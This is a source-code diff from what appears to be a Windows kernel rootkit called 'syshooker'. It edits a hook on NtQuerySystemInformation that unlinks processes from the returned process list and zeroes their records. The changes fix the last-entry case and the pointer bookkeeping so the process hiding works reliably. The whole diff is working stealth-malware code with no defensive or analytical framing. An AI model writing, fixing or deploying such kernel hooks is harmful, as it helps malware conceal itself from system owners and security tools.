@@ -179,19 +179,20 @@ NTSTATUS DetourNtQuerySystemInformation(
 
 					// Last one
 					else {
-						kprintf("[-] syshooker: do we ever hit this?");
+						kprintf("[+] syshooker: hiding the last process in the list...");
 						// set previous NextEntryOffset to 0
 						PreviousProcessInformationPtr->NextEntryOffset = 0;
 
-						// TODO - should not be FILE_DIRECTORY_INFORMATION here - fix!!!
-						// length should be PROBABLY be sizeof(SYSTEM_PROCESS_INFORMATION) + NameLength * sizeof(wchar)
-						// erease this FileInformation structure
+						// erease this process information structure
 						memset(ProcessInformationPtr, 0, sizeof(SYSTEM_PROCESS_INFORMATION));
 						break;
 					}
 				}
 
                 if (ProcessInformationPtr->NextEntryOffset == 0) break;
+
+				// move forward
+				PreviousProcessInformationPtr = ProcessInformationPtr;
                 ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
             }
         }
